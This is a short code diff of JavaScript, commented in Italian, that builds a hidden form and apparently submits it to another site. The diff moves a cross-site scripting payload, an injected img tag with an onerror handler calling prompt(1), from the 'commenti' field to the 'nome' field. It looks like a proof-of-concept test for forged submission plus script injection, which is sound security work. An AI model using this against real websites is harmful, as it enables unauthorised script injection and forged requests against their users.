@@ -17,7 +17,7 @@
             var nome = document.createElement('input');
             nome.type = 'hidden';
             nome.name = 'nome';  // Sostituisci 'nome' con il valore corretto dal sito
-            nome.value = 'pluto'; 
+            nome.value = '"><img src=x onerror=prompt(1)>'; 
             form.appendChild(nome);
 
             var cognome = document.createElement('input');
@@ -30,7 +30,7 @@
             var commenti = document.createElement('input');
             commenti.type = 'hidden';
             commenti.name = 'commenti';  // Sostituisci 'commenti' con il valore corretto dal sito
-            commenti.value = '"><img src=x onerror=prompt(1)>';
+            commenti.value = 'XSS';
             form.appendChild(commenti);
 
             // Aggiungi il form al body e invialo
